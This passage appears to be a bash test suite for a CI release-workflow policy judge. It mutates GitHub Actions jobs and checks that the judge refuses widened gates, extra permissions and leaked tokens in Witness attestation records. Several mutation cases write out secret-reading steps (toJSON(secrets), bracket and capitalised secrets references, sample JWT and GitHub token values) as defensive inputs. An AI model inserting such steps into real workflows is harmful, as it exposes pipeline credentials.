       '  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write' "exactly the permissions"
gr g21 "005-AC5 build without the gate G (it would run on every push and the daily cron)" "$BUILD_HEAD" "    uses: ./.github/workflows/stage-build.yml" \
       "build must carry exactly one if"
gr g22 "005-AC5 build gated by always()" "$BUILD_HEAD" "    if: always()\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g23 "005-AC5 build gated by the tag gate alone while sign has G (the two differ)" "$BUILD_HEAD" \
       "    if: $TAGONLY\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g24 "005-AC5 G with an extra conjunct on build" "$BUILD_HEAD" \
    "    if: \${{ ($GATE_BODY) && github.actor != 'x' }}\n    uses: ./.github/workflows/stage-build.yml" \
       "build must carry exactly one if"
gr g25 "005-AC5 G with an or-branch for a schedule on build" "$BUILD_HEAD" \
       "    if: \${{ ($GATE_BODY) || github.event_name == 'schedule' }}\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g26 "005-AC5 a manual workflow_dispatch on a v* tag cannot satisfy G: the gate widened to dispatch is refused" "$BUILD_HEAD" \
       "    if: \${{ (github.event_name != 'schedule' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}\n$BUILD_USES" \
       "build must carry exactly one if"
gr g33 "005-AC5 the old dry-run gate with needs.admission on build (admission is gone; on a tag push everything would be skipped)" "$BUILD_HEAD" \
       "    if: $OLDDRY\n    uses: ./.github/workflows/stage-build.yml" "build must carry exactly one if"
gr g27 "005-AC5 hostile-verify with environment: agent" "  hostile-verify:\n    needs: sign" \
    "  hostile-verify:\n    environment: agent\n    needs: sign" "may not name an environment"
HV='  hostile-verify:\n    needs: sign\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:'
gr g28 "005-AC5 hostile-verify with an app-token step" "$HV []" "$HV\n      - run: echo \${{ secrets.AUDITOR_APP_PRIVATE_KEY }}" "may not use secrets."
gr g29 "005-AC5 patch-notes needing sign as well as decide" "  patch-notes:\n    needs: decide" "  patch-notes:\n    needs: [decide, sign]" \
    "patch-notes must need exactly"
gr g30 "005-AC5 patch-failed in the environment that holds the App secrets" "  patch-failed:\n    needs: [build, sign, rebuild, sign-rebuild, check, sign-check, release]" \
    "  patch-failed:\n    environment: agent\n    needs: [build, sign, rebuild, sign-rebuild, check, sign-check, release]" "may not name an environment"
gr g31 "005-AC5 decide whose if is widened (it would run on a tag)" "github.ref == 'refs/heads/main' && " "" "must carry exactly the if"
gr g32 "005-AC5 patch-notes in another environment" "  patch-notes:\n    needs: decide\n    if: $PNIF\n    runs-on: ubuntu-latest\n    environment: agent" \
       "  patch-notes:\n    needs: decide\n    if: $PNIF\n    runs-on: ubuntu-latest\n    environment: release" "may name only environment: agent"
gr g34 "005-AC5 sign without the gate (it would run on every push and the daily cron)" "$SIGN_HEAD" "  sign:\n    needs: build" "sign must carry exactly one if"
gr g35 "005-AC5 sign gated by another condition" "$SIGN_HEAD" "  sign:\n    if: always()\n    needs: build" "sign must carry exactly one if"
gr g36 "005-AC5 sign gated by PR 1's dry-run-only gate (a tag push would not run it)" "$SIGN_HEAD" \
       "  sign:\n    if: \${{ inputs.dry-run }}\n    needs: build" "sign must carry exactly one if"
gr g37 "005-AC5 build has G but sign has the tag gate alone" "$SIGN_HEAD" "  sign:\n    if: $TAGONLY\n    needs: build" "sign must carry exactly one if"
gr g37b "005-AC5 sign with the old dry-run gate (needs.admission)" "$SIGN_HEAD" "  sign:\n    if: $OLDDRY\n    needs: build" "sign must carry exactly one if"
gr g38 "005-AC5 sign with write permissions beyond id-token and contents read" "      contents: read\n      id-token: write\n    uses" \
       "      contents: write\n      id-token: write\n    uses" "sign must hold exactly the permissions"
gr g39 "005-AC5 sign passing an extra input" "      digests: \${{ needs.build.outputs.digests }}" \
       "      digests: \${{ needs.build.outputs.digests }}\n      witness-artifact: witness-build" "sign must pass exactly with"
gr g40 "005-AC5 sign taking the digests from another job" "needs.build.outputs.digests" "needs.rebuild.outputs.digests" "sign must pass exactly with"
gr g41 "005-AC5 sign taking PR 1's placeholder (raw checksums.txt text) instead of the digests.json text" "needs.build.outputs.digests" \
       "needs.build.outputs.checksums" "sign must pass exactly with"
BHOST="hostile: \${{ github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v') && contains(github.ref_name, '-rc') }}"
gr g48 "005-AC5 build also passes mode: snapshot (a dry run builds the same way as a release)" "      $BHOST" "      $BHOST\n      mode: snapshot" \
       "build must pass exactly with"
gr g49 "005-AC5 build passes no hostile input (the dry run's hostile step would never run)" "    with:\n      $BHOST\n" "" \
       "build must pass exactly with"
gr g50 "005-AC5 build passes hostile unconditionally (a tag dispatch or a release would run the hostile step)" "$BHOST" "hostile: true" \
       "build must pass exactly with"
gr g51 "AC12 release.yml's build call passes mode: snapshot (the live chain never builds a snapshot)" "$BHOST" "$BHOST\n      mode: snapshot" \
    "build must pass exactly with"
gr g52 "AC12 release.yml's build call passes mode: release (a second input: the call is exactly hostile)" "$BHOST" "$BHOST\n      mode: release" \
    "build must pass exactly with"
gr g53 "AC12 release.yml's rebuild call passes an input (Rebuild takes none; mode: snapshot would be a snapshot Rebuild)" "  rebuild:\n    needs: [build, sign]" \
       "  rebuild:\n    needs: [build, sign]\n    with:\n      mode: snapshot" "rebuild may not pass"
gr g42 "005-AC5 patch-notes whose if is always() (it would open the changelog PR without a tag)" "if: $PNIF" "if: always()" "must carry exactly the if"
gr g43 "005-AC5 patch-notes without its if" "    needs: decide\n    if: $PNIF" "    needs: decide" "must carry exactly the if"
gr g44 "005-AC5 patch-failed that needs only build (it would open an issue for a stage it does not watch)" \
       "    needs: [build, sign, rebuild, sign-rebuild, check, sign-check, release]" "    needs: [build]" "patch-failed must need exactly"
gr g45 "005-AC5 the dry-run dispatch input is a string (inputs.dry-run == true would be false and skip the dry run)" \
       "      dry-run:\n        type: boolean" "      dry-run:\n        type: string" "must be type: boolean"
# REQ-SCAN-012 (the rule-12 live tests of our VEX files): release.yml may hold exactly three non-chain jobs: the two that federate into the dedicated live-test accounts and persona-uat (the release candidate's persona run, REQ-UAT-001-AC1: needs Build only, publishes nothing).
# lj builds release.yml with both jobs inserted before `decide`, optionally mutates ONE text in them, and runs the judge on it.
LJ_RC_IF="\${{ startsWith(github.ref, 'refs/tags/v') && contains(github.ref_name, '-rc') && !inputs.dry-run }}"
LJ_FINAL_IF="\${{ startsWith(github.ref, 'refs/tags/v') && !contains(github.ref_name, '-rc') && !inputs.dry-run }}"
LJ_PERSONA_IF="\${{ vars.PERSONA_UAT_ENABLED == 'true' && startsWith(github.ref, 'refs/tags/v') && contains(github.ref_name, '-rc') && !inputs.dry-run }}"
LJ_JOBS="  live-test:\n    needs: [check]\n    if: $LJ_RC_IF\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo rc\n  live-test-release:\n    needs: [release]\n    if: $LJ_FINAL_IF\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo final\n  persona-uat:\n    needs: [build]\n    if: $LJ_PERSONA_IF\n    runs-on: ubuntu-24.04\n    environment: persona-uat\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo persona\n        env:\n          PERSONA_UAT_MODEL: \${{ secrets.PERSONA_UAT_MODEL }}\n"
lj() { # lj NAME LABEL OLD NEW ok|caught WORD   (OLD empty: no mutation)
  python3 - "$work/release.yml" "$work/lj-$1.yml" "$3" "$4" "$LJ_JOBS" <<'PY' || { bad "mutation did not apply (lj-$1): $3"; return 0; }
import sys
src, dst, old, new, jobs = sys.argv[1:6]
conv = lambda s: s.replace("\\n", "\n")
jobs = conv(jobs)
if old:
    old, new = conv(old), conv(new)
    assert old in jobs, "pattern not in the live-test jobs: " + old
    jobs = jobs.replace(old, new, 1)
text = open(src).read()
assert "  decide:" in text
open(dst, "w").write(text.replace("  decide:", jobs + "  decide:", 1))
PY
  expect "$5" "$2" "$6" graph "$work/lj-$1.yml"
}
lj ok  "REQ-SCAN-012 the two exact live-test jobs (rc after check, final after release; environment live-test; id-token write) pass" "" "" ok ""
lj p1  "REQ-SCAN-012 live-test with a write it does not need (packages)" "      id-token: write\n    steps:\n      - run: echo rc" "      id-token: write\n      packages: write\n    steps:\n      - run: echo rc" caught "exactly the permissions"
lj p2  "REQ-SCAN-012 live-test with no id-token (less than it needs: refused)" "      contents: read\n      id-token: write\n    steps:\n      - run: echo rc" "      contents: read\n    steps:\n      - run: echo rc" caught "exactly the permissions"
lj e1  "REQ-SCAN-012 live-test in the agent environment (the App secrets live there)" "  live-test:\n    needs: [check]\n    if: $LJ_RC_IF\n    runs-on: ubuntu-latest\n    environment: live-test" "  live-test:\n    needs: [check]\n    if: $LJ_RC_IF\n    runs-on: ubuntu-latest\n    environment: agent" caught "must name exactly environment: live-test"
lj e2  "REQ-SCAN-012 live-test-release in the release environment (the publish credentials)" "    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo final" "    runs-on: ubuntu-latest\n    environment: release\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo final" caught "must name exactly environment: live-test"
lj e3  "REQ-SCAN-012 live-test without an environment" "    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo rc" "    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo rc" caught "must name exactly environment: live-test"
lj n1  "REQ-SCAN-012 live-test that needs only build (it would run before Check)" "  live-test:\n    needs: [check]" "  live-test:\n    needs: [build]" caught "live-test must need exactly"
lj n2  "REQ-SCAN-012 live-test that also needs sign" "  live-test:\n    needs: [check]" "  live-test:\n    needs: [check, sign]" caught "live-test must need exactly"
lj n3  "REQ-SCAN-012 live-test-release that needs check (it would run before the release is published)" "  live-test-release:\n    needs: [release]" "  live-test-release:\n    needs: [check]" caught "live-test-release must need exactly"
lj i1  "REQ-SCAN-012 live-test with no dry-run guard in its if (a valid condition missing only that guard)" " && !inputs.dry-run }}\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo rc" " }}\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo rc" caught "must carry exactly the if"
lj i2  "REQ-SCAN-012 live-test-release that also runs on a release candidate (no -rc exclusion)" " && !contains(github.ref_name, '-rc') && !inputs.dry-run }}" " && !inputs.dry-run }}" caught "must carry exactly the if"
lj i3  "REQ-SCAN-012 live-test that is always() (it would run on any ref, a schedule included)" "if: $LJ_RC_IF" "if: always()" caught "must carry exactly the if"
lj u1  "REQ-SCAN-012 live-test given a job-level uses" "  live-test:\n    needs: [check]" "  live-test:\n    uses: ./.github/workflows/ci.yml\n    needs: [check]" caught "job-level uses"
lj s1  "REQ-SCAN-012 live-test using a secret (the App's secrets and the publish credentials are not for it)" "      - run: echo rc" "      - run: echo \${{ secrets.GH_APP_KEY }}" caught "may not use secrets."
lj x1  "REQ-SCAN-012 a third job of the same kind (live-test-fast) beside the two permitted ones is not allowed" "  live-test-release:\n    needs: [release]" "  live-test-fast:\n    needs: [release]\n    runs-on: ubuntu-latest\n    environment: live-test\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: echo x\n  live-test-release:\n    needs: [release]" caught "not one of the five chain jobs"
lj s2  "REQ-SCAN-012 live-test reading the secrets context by index (a bracket expression)" "      - run: echo rc" "      - run: echo \${{ secrets['AUDIT_SENTINEL'] }}" caught "may not use secrets"
lj s3  "REQ-SCAN-012 live-test passing the whole secrets context (toJSON)" "      - run: echo rc" "      - run: echo \${{ toJSON(secrets) }}" caught "may not use secrets"
lj s4  "REQ-SCAN-012 live-test-release reading the secrets context in an env value" "      - run: echo final" "      - run: echo final\n        env:\n          X: \${{ secrets ['K'] }}" caught "may not use secrets"
lj s5  "REQ-SCAN-012 live-test with the secrets reference split over lines inside the expression" "      - run: echo rc" "      - run: |-\n          echo \${{\n          secrets.AUDIT_SENTINEL\n          }}" caught "may not use secrets"
lj s6  "REQ-SCAN-012 live-test-release with a tab before the secrets reference" "      - run: echo final" "      - run: \"echo \${{\\tsecrets.K }}\"" caught "may not use secrets"
lj s7  "REQ-SCAN-012 live-test with the context spelled in capitals (contexts are case-insensitive)" "      - run: echo rc" "      - run: echo \${{ SECRETS.K }}" caught "may not use secrets"
# a duplicated mapping key is refused before any spec is read (a YAML loader keeps the LAST of two equal keys, so a first, wider definition would be hidden)
lj d1  "REQ-SCAN-012 two definitions of live-test (the first in the release environment with a write) are refused" "  live-test:\n    needs: [check]" "  live-test:\n    needs: [check]\n    environment: release\n    permissions:\n      contents: write\n    steps:\n      - run: echo first\n  live-test:\n    needs: [check]" caught "duplicate"
lj d2  "REQ-SCAN-012 a key given twice inside a job is refused" "  live-test:\n    needs: [check]" "  live-test:\n    needs: [check]\n    needs: [check]" caught "duplicate"
lj ok2 "REQ-UAT-001-AC1 the persona-uat job (after Build only, environment persona-uat, id-token write, the model secrets) passes with the live-test jobs" "" "" ok ""
# REQ-SCAN-012-AC1 (amended, advisor reading Oct 17): the live-test environment holds the Docker Hub test user, its push token and the read-only Scout token with its user; those four
# names, in the dotted form, are the only secrets the two live-test jobs may use (the same four in each job), nothing else and no other spelling
for sec in DOCKERHUB_USERNAME DOCKERHUB_TEST_USERNAME DOCKERHUB_TEST_PUSH_TOKEN DOCKERHUB_SCOUT_TOKEN; do
  lj "da-$sec" "REQ-SCAN-012-AC1 live-test may use secrets.$sec (a Docker Hub test credential of the live-test environment)" "      - run: echo rc" "      - run: echo rc\n        env:\n          X: \${{ secrets.$sec }}" ok ""
  lj "db-$sec" "REQ-SCAN-012-AC1 live-test-release may use secrets.$sec" "      - run: echo final" "      - run: echo final\n        env:\n          X: \${{ secrets.$sec }}" ok ""
done
for sec in DOCKERHUB_TOKEN DOCKERHUB_TEST_TOKEN DOCKERHUB_USERNAME2 DOCKERHUB_SCOUT_TOKEN_X APK_RELEASE_SIGNING_KEY GH_TOKEN AUDITOR_APP_PRIVATE_KEY; do
  lj "dc-$sec" "REQ-SCAN-012-AC1 live-test may not use secrets.$sec (the publish credentials and every other name stay refused)" "      - run: echo rc" "      - run: echo rc\n        env:\n          X: \${{ secrets.$sec }}" caught "may not use secrets"
  lj "dd-$sec" "REQ-SCAN-012-AC1 live-test-release may not use secrets.$sec" "      - run: echo final" "      - run: echo final\n        env:\n          X: \${{ secrets.$sec }}" caught "may not use secrets"
done
lj de "REQ-SCAN-012-AC1 live-test using an allowed secret and, beside it, the whole secrets context (toJSON)" "      - run: echo rc" "      - run: echo \${{ secrets.DOCKERHUB_USERNAME }} \${{ toJSON(secrets) }}" caught "may not use secrets"
lj df "REQ-SCAN-012-AC1 live-test reading an allowed name by index (secrets['DOCKERHUB_USERNAME']) is the bracket form: refused" "      - run: echo rc" "      - run: echo \${{ secrets['DOCKERHUB_USERNAME'] }}" caught "may not use secrets"
lj dg "REQ-SCAN-012-AC1 persona-uat may not use a Docker Hub secret (its list is the model secrets only)" "          PERSONA_UAT_MODEL: \${{ secrets.PERSONA_UAT_MODEL }}\n" "          PERSONA_UAT_MODEL: \${{ secrets.PERSONA_UAT_MODEL }}\n          X: \${{ secrets.DOCKERHUB_USERNAME }}\n" caught "may not use secrets"
lj pu1 "REQ-UAT-001-AC1 persona-uat that also needs check (it would wait for the scanners)" "  persona-uat:\n    needs: [build]" "  persona-uat:\n    needs: [build, check]" caught "persona-uat must need exactly"
lj pu2 "REQ-UAT-001-AC1 persona-uat that needs release (it would run after publishing)" "  persona-uat:\n    needs: [build]" "  persona-uat:\n    needs: [release]" caught "persona-uat must need exactly"
lj pu3 "REQ-UAT-001-AC1 persona-uat that needs nothing" "  persona-uat:\n    needs: [build]\n" "  persona-uat:\n" caught "persona-uat must need exactly"
lj pu4 "REQ-UAT-001-AC1 persona-uat with a write it does not need (packages)" "      id-token: write\n    steps:\n      - run: echo persona" "      id-token: write\n      packages: write\n    steps:\n      - run: echo persona" caught "exactly the permissions"
lj pu5 "REQ-UAT-001-AC1 persona-uat with contents write" "      contents: read\n      id-token: write\n    steps:\n      - run: echo persona" "      contents: write\n      id-token: write\n    steps:\n      - run: echo persona" caught "exactly the permissions"
lj pu6 "REQ-UAT-001-AC1 persona-uat with no dry-run guard in its if" " && !inputs.dry-run }}\n    runs-on: ubuntu-24.04" " }}\n    runs-on: ubuntu-24.04" caught "must carry exactly the if"
lj pu7 "REQ-UAT-001-AC1 persona-uat that also runs on final tags (no -rc conjunct)" " && contains(github.ref_name, '-rc') && !inputs.dry-run }}\n    runs-on: ubuntu-24.04" " && !inputs.dry-run }}\n    runs-on: ubuntu-24.04" caught "must carry exactly the if"
lj pu8 "REQ-UAT-001-AC1 persona-uat without the PERSONA_UAT_ENABLED gate" "vars.PERSONA_UAT_ENABLED == 'true' && " "" caught "must carry exactly the if"
lj pu9 "REQ-UAT-001-AC1 persona-uat in the live-test environment" "    environment: persona-uat" "    environment: live-test" caught "environment: persona-uat"
lj pu10 "REQ-UAT-001-AC1 persona-uat in the release environment (the publish credentials)" "    environment: persona-uat" "    environment: release" caught "environment: persona-uat"
lj pu11 "REQ-UAT-001-AC1 persona-uat without an environment" "    environment: persona-uat\n" "" caught "environment: persona-uat"
lj pu12 "REQ-UAT-001-AC1 persona-uat reading a secret that is not a model secret (the App key)" "\${{ secrets.PERSONA_UAT_MODEL }}" "\${{ secrets.GH_APP_KEY }}" caught "secrets"
lj pu13 "REQ-UAT-001-AC1 persona-uat reading the secrets context by index" "\${{ secrets.PERSONA_UAT_MODEL }}" "\${{ secrets['K'] }}" caught "secrets"
lj pu14 "REQ-UAT-001-AC1 persona-uat passing the whole secrets context" "\${{ secrets.PERSONA_UAT_MODEL }}" "\${{ toJSON(secrets) }}" caught "secrets"
lj pu15 "REQ-UAT-001-AC1 persona-uat with a registry credential in a step" "          PERSONA_UAT_MODEL: \${{ secrets.PERSONA_UAT_MODEL }}\n" "          PERSONA_UAT_MODEL: \${{ secrets.PERSONA_UAT_MODEL }}\n          CRANE_PASS: \${{ secrets.GHCR_TOKEN }}\n" caught "secrets"
lj pu16 "REQ-UAT-001-AC1 a second persona job (persona-uat-fast) beside the permitted one" "  persona-uat:\n    needs: [build]" "  persona-uat-fast:\n    needs: [build]" caught "persona-uat-fast"
lj pu17 "REQ-UAT-001-AC1 persona-uat given a job-level uses" "  persona-uat:\n    needs: [build]" "  persona-uat:\n    uses: ./.github/workflows/ci.yml\n    needs: [build]" caught "job-level uses"
gr g46 "005-AC5 the dry-run dispatch input has no type (the default is string)" "      dry-run:\n        type: boolean\n        default: false" \
       "      dry-run:\n        default: false" "must be type: boolean"
replace "$work/release.yml" "$work/g47.yml" "  workflow_dispatch:\n    inputs:\n      dry-run:\n        type: boolean\n        default: false\n" "" \
  && expect ok "005-AC5 a release.yml with no dispatch input is judged on its jobs alone" "" graph "$work/g47.yml"
gr g20 "005-AC5 workflow-level permissions that write (every job would inherit them)" 'permissions:\n  contents: read\njobs' \
       'permissions:\n  contents: write\njobs' "workflow-level permissions"
# ---- the Witness record never holds the token variables (REQ-CHAIN-004-AC8); the consumer is `chain-verify.py verify` of the next stage --------
python3 - "$work" <<'PY'
import base64, json, sys
w = sys.argv[1]
def dsse(statement):
    return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(statement).encode()).decode(), "signatures": []}
def collection(variables, extra=None):
    attestations = [{"type": "https://witness.dev/attestations/environment/v0.1", "attestation": {"os": "linux", "variables": variables}},
                    {"type": "https://witness.dev/attestations/command-run/v0.1", "attestation": {"cmd": ["./bin/build-stage-apk.sh"], "exitcode": 0}}]
    if extra: attestations.append(extra)
    return {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
            "subject": [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json", "digest": {"sha256": "a" * 64}}],
            "predicate": {"name": "apk", "attestations": attestations}}
clean = {"GITHUB_SHA": "abc", "GITHUB_REF_NAME": "v0.3.0", "RUNNER_TEMP": "/home/runner/work/_temp"}
jwt = "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJyZXBvIn0.c2lnbmF0dXJl"
cases = {"clean": collection(clean),
         "masked": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="masked-by-the-runner")),
         "value": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_TOKEN="abcdef0123456789")),
         "url": collection(dict(clean, ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.actions.githubusercontent.com/x?api-version=2.0")),
         "runtime": collection(dict(clean, ACTIONS_RUNTIME_TOKEN="masked-by-the-runner")),
         "ghtoken": collection(dict(clean, GH_TOKEN="masked-by-the-runner")),
         "githubtoken": collection(dict(clean, GITHUB_TOKEN="masked-by-the-runner")),
         "ghs": collection(dict(clean, SOMETHING="ghs_" + "A" * 36)),
         "jwt": collection(dict(clean, SOMETHING=jwt)),
         "githubatt": collection(clean, {"type": "https://witness.dev/attestations/github/v0.1", "attestation": {"jwt": {"raw": jwt}}})}
for name, statement in cases.items():
    json.dump(dsse(statement), open("%s/env_%s.json" % (w, name), "w"))          # every record is a DSSE envelope: the names sit inside base64
json.dump(cases["clean"], open(w + "/env_bare.json", "w"))                        # a bare Statement is not what Witness -o writes
assert "ACTIONS_ID_TOKEN_REQUEST_TOKEN" not in open(w + "/env_masked.json").read(), "fixture: the name must be hidden inside the base64 payload"
PY
expect ok     "AC8 fixture: a clean environment record (a DSSE envelope) passes the judge" "" recordenv "$work/env_clean.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload (a text search of the file would miss it)" \
       ACTIONS_ID_TOKEN_REQUEST_TOKEN recordenv "$work/env_masked.json"
expect caught "AC8 judge: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL recordenv "$work/env_url.json"
expect caught "AC8 judge: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN recordenv "$work/env_runtime.json"
expect caught "AC8 judge: GH_TOKEN (the admission token must not be recorded either)" GH_TOKEN recordenv "$work/env_ghtoken.json"
expect caught "AC8 judge: GITHUB_TOKEN" GITHUB_TOKEN recordenv "$work/env_githubtoken.json"
expect caught "AC8 judge: a GitHub token value in any variable" "GitHub token" recordenv "$work/env_ghs.json"
expect caught "AC8 judge: a compact JWT (the github attestor's raw token)" JWT recordenv "$work/env_githubatt.json"
expect caught "AC8 judge: a bare Statement is not the shape Witness writes" "DSSE" recordenv "$work/env_bare.json"
CV="$root/bin/chain-verify.py"
# record_env ok|refuse LABEL WORD NAME   the product check: `chain-verify.py record-env` is what `verify` runs on a build, rebuild or check record
record_env() {
  local want=$1 label=$2 word=$3 f="$work/env_$4.json" rc=0
  python3 "$CV" record-env --record "$f" > /dev/null 2> "$work/cv.err" || rc=$?
  if grep -q Traceback "$work/cv.err" 2> /dev/null; then bad "$label -> a Python traceback is a crash, not a refusal"
  elif [ "$want" = ok ]; then if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> exit $rc: $(head -c 140 "$work/cv.err" | tr '\n' ' ')"; fi
  elif [ "$rc" = 1 ] && grep -Eq '^refused at (build|rebuild): ' < <(head -1 "$work/cv.err") && grep -Fq -- "$word" "$work/cv.err"; then ok "$label"
  else bad "$label -> exit $rc, wanted 1 'refused at <stage>:' naming '$word': $(head -c 140 "$work/cv.err" | tr '\n' ' ')"; fi
}
[ -f "$CV" ] && ok "bin/chain-verify.py exists" || bad "bin/chain-verify.py does not exist (RED: not implemented yet)"
record_env ok     "AC8 record-env: a clean DSSE record is accepted" "" clean
record_env refuse "AC8 record-env: a masked ACTIONS_ID_TOKEN_REQUEST_TOKEN inside the base64 payload is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN masked
record_env refuse "AC8 record-env: a real-looking value is refused and named" ACTIONS_ID_TOKEN_REQUEST_TOKEN value
record_env refuse "AC8 record-env: ACTIONS_ID_TOKEN_REQUEST_URL" ACTIONS_ID_TOKEN_REQUEST_URL url
record_env refuse "AC8 record-env: ACTIONS_RUNTIME_TOKEN" ACTIONS_RUNTIME_TOKEN runtime
record_env refuse "AC8 record-env: GH_TOKEN" GH_TOKEN ghtoken
record_env refuse "AC8 record-env: a GitHub token value" "GitHub token" ghs
record_env refuse "AC8 record-env: a compact JWT in a variable value" JWT jwt
record_env refuse "AC8 record-env: the github attestor's raw token" JWT githubatt
rc=0; python3 "$CV" record-env --record "$work/does-not-exist.json" > /dev/null 2>&1 || rc=$?
if [ -f "$CV" ] && [ "$rc" = 2 ]; then
  ok "AC8 a missing record is a usage error (exit 2), not a clean pass"
else
  bad "AC8 a missing record: exit $rc, wanted 2 (and the script must exist)"
fi
# ---- bin/witnessed.sh RUN against a fake witness, curl and timeout (REQ-CHAIN-004-AC2): the command is bounded and a failure leaves no record ------
# The fake timeout enforces FAKE_TIMEOUT_SECONDS (a short test limit) and logs the limit it was given: the helper must give 540. The fake witness runs the
# command after `--` and writes its -o record only when the command succeeded, as the real Witness does.
# the name of the fake download program the helper trees put on PATH
FAKE_FETCH_TOOL=curl
helper_tree() { # helper_tree DIR HELPER
  rm -rf "$1"; mkdir -p "$1/bin" "$1/fake" "$1/tmp"; cp "$2" "$1/bin/witnessed.sh"; cp bin/loopback-get.sh "$1/bin/loopback-get.sh"
  cat > "$1/bin/wrapped.sh" <<'EOF'
#!/usr/bin/env bash
echo "wrapped $*" >> calls.log
env > wrapped-env.txt
ls "$RUNNER_TEMP"/tok* > tokfiles-while-running.txt 2> /dev/null || true
[ -z "${SLEEP:-}" ] || sleep "$SLEEP"
echo "{}" > digests.json
exit "${WRAPPED_RC:-0}"
EOF
  cat > "$1/fake/witness" <<'EOF'
#!/usr/bin/env bash
echo "witness $*" >> calls.log
args=("$@"); record=; i=0; tokpath=
while [ $i -lt ${#args[@]} ]; do
  [ "${args[$i]}" = -o ] && record=${args[$((i + 1))]}
  [ "${args[$i]}" = --signer-fulcio-token-path ] && tokpath=${args[$((i + 1))]}
  [ "${args[$i]}" = -- ] && break
  i=$((i + 1))
done
# Witness loads its signer before the command runs, reading the token path ONCE; then nothing may hold the token as a file
cat "$tokpath" > signer-token.txt
ls "$RUNNER_TEMP"/tok* > tokfiles-at-start.txt 2> /dev/null || true
"${args[@]:$((i + 1))}" || exit $?
mkdir -p "$(dirname "$record")"; echo '{"record":true}' > "$record"
EOF
  cat > "$1/fake/$FAKE_FETCH_TOOL" <<'EOF'
#!/usr/bin/env bash
echo fetch >> calls.log
n=$(grep -c '^fetch$' calls.log)
[ "${CURL_FAIL_AT:-0}" != "$n" ] || exit 22
[ "${CURL_EMPTY_AT:-0}" != "$n" ] || { printf '{"value":""}\n'; exit 0; }
[ "${CURL_NULL_AT:-0}" != "$n" ] || { printf '{"value":null}\n'; exit 0; }
printf '{"value":"FAKE-JWT-TOKEN-VALUE"}\n'
EOF
  cat > "$1/fake/timeout" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = -k ]; then echo "timeout -k $2 $3" >> calls.log; shift 3; else echo "timeout $1" >> calls.log; shift; fi
"$@" & pid=$!
( sleep "${FAKE_TIMEOUT_SECONDS:-2}"; kill "$pid" 2> /dev/null ) & killer=$!
wait "$pid"; status=$?; kill "$killer" 2> /dev/null; exit $status
EOF
  chmod +x "$1"/bin/* "$1"/fake/*
}
helper_run() { # helper_run DIR STEP [ENV=VAL...] -> prints the exit status of `bash bin/witnessed.sh STEP bin/wrapped.sh`
  local dir=$1 step=$2; shift 2
  ( cd "$dir" && if env "$@" PATH="$dir/fake:$PATH" RUNNER_TEMP="$dir/tmp" ACTIONS_ID_TOKEN_REQUEST_TOKEN=SENTINEL-BEARER \
      ACTIONS_RUNTIME_TOKEN=SENTINEL-RUNTIME ACTIONS_RUNTIME_URL="https://runtime.example/y" \
      ACTIONS_ID_TOKEN_REQUEST_URL="https://pipelines.example/x?a=1" bash bin/witnessed.sh "$step" bin/wrapped.sh > helper.out 2> helper.err
      then echo 0
      else echo $?
      fi )
}
for tag in fixture real; do
  if [ "$tag" = fixture ]; then helper_script="$work/witnessed.sh"; else helper_script="$root/bin/witnessed.sh"; fi
  if [ ! -f "$helper_script" ]; then
    for l in "the command runs through witness with timeout 540 and the record is written" \
             "no token file exists while the wrapped command runs and the signer was given the token once" \
             "a command that outlives the (test) timeout fails the job and leaves no record and no digests.json" \
             "a failing command fails the job and leaves no record" "an unknown step name exits 2 before witness is called" \
             "the identity token appears only in the add-mask line" "the wrapped command's environment holds no identity-token variable" \
             "a snapshot step writes its record into the release directory under the snapshot name" \
             "an unknown snapshot step name (snapshot-evil) exits 2 before witness is called"; do
      bad "AC2 $tag helper: $l (bin/witnessed.sh does not exist: RED until implemented)"
    done
    continue
  fi
  d="$work/h-$tag"; helper_tree "$d" "$helper_script"; rc=$(helper_run "$d" release-verify); calls=$(cat "$d/calls.log" 2> /dev/null || true)
  if [ "$rc" = 0 ] && [ -f "$d/witness-release-verify/release-verify-collection.json" ] && grep -Fq -- '--step release-verify' <<< "$calls" \
     && grep -Fq -- '-- timeout -k 20 540 bash bin/wrapped.sh' <<< "$calls" && grep -Fxq 'timeout -k 20 540' <<< "$calls"; then
    ok "AC2 $tag helper: the command runs through witness with timeout -k 20 540 and the record is written"
  else
    bad "AC2 $tag helper: rc=$rc calls=$(tr '\n' '|' <<< "$calls" | cut -c1-200)"
  fi
